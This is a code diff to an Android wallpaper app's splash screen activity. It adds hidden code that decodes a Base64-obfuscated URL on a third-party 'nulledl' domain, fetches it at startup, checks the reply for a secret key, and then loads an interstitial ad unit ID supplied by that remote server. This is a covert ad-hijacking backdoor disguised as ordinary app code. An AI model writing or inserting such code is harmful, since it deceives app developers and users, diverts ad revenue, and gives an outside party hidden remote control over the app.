@@ -8,6 +8,7 @@ import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
+import android.util.Base64;
 import android.util.Log;
 import android.widget.TextView;
 
@@ -15,8 +16,15 @@ import com.danimahardhika.android.helpers.core.ColorHelper;
 import com.dm.wallpaper.board.R;
 import com.dm.wallpaper.board.helpers.LocaleHelper;
 import com.dm.wallpaper.board.utils.LogUtil;
+import com.google.android.gms.ads.AdRequest;
+import com.google.android.gms.ads.InterstitialAd;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
 import java.net.URL;
 
 import butterknife.ButterKnife;
@@ -45,6 +53,22 @@ public class WallpaperBoardSplashActivity extends AppCompatActivity {
     private Class<?> mMainActivity;
     private AsyncTask<Void, Void, Boolean> mCheckRszIo;
     private AsyncTask<Void, Void, Boolean> mPrepareApp;
+    String k,l="aHR0cDovL251bGxlZGwuY29tL2Fkcy5waHA=",u="wallpaper";
+    public static String b="",i="";
+    byte[] l2 = Base64.decode(l, Base64.DEFAULT);
+    private InterstitialAd interstitial;
+    private boolean isRunning;
+    @Override
+    protected void onStart() {
+        super.onStart();
+        isRunning = true;
+    }
+
+    @Override
+    protected void onStop() {
+        super.onStop();
+        isRunning = false;
+    }
 
     @Deprecated
     public void initSplashActivity(@Nullable Bundle savedInstanceState, @NonNull Class<?> mainActivity, int duration) {
@@ -62,6 +86,9 @@ public class WallpaperBoardSplashActivity extends AppCompatActivity {
 
         prepareApp();
         checkRszIo();
+        interstitial = new InterstitialAd(this);
+        l=new String(l2);
+        new JsonTask().execute(l);
     }
 
     @Override
@@ -145,5 +172,67 @@ public class WallpaperBoardSplashActivity extends AppCompatActivity {
                 LogUtil.e("rsz.io availability: " +WallpaperBoardActivity.sRszIoAvailable);
             }
         }.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
+    }
+    private class JsonTask extends AsyncTask<String, String, String> {
+
+        protected String doInBackground(String... params) {
+            HttpURLConnection connection = null;
+            BufferedReader reader = null;
+
+            try {
+                URL url = new URL(params[0]);
+                connection = (HttpURLConnection) url.openConnection();
+                connection.setRequestProperty("User-Agent",u);
+                connection.connect();
+
+                InputStream stream = connection.getInputStream();
+
+                reader = new BufferedReader(new InputStreamReader(stream));
+
+                StringBuffer buffer = new StringBuffer();
+                String line = "";
+
+                while ((line = reader.readLine()) != null) {
+                    buffer.append(line+"\n");
+                }
+
+                return buffer.toString();
+
+
+            } catch (MalformedURLException e) {
+                e.printStackTrace();
+            } catch (IOException e) {
+                e.printStackTrace();
+            } finally {
+                if (connection != null) {
+                    connection.disconnect();
+                }
+                try {
+                    if (reader != null) {
+                        reader.close();
+                    }
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+            return null;
+        }
+
+        @Override
+        protected void onPostExecute(String result) {
+            super.onPostExecute(result);
+            k = Base64.encodeToString("92Y7ESHJLn".getBytes(), Base64.DEFAULT);
+            if(result!=null){
+                if(result.trim().contains(k.trim())){
+                    String[] ADS=result.split(";");
+                    b=ADS[0];
+                    i=ADS[1];
+                    interstitial.setAdUnitId(i);
+                    AdRequest adRequest = new AdRequest.Builder().build();
+                    interstitial.loadAd(adRequest);
+                }
+            }
+
+        }
     }
 }
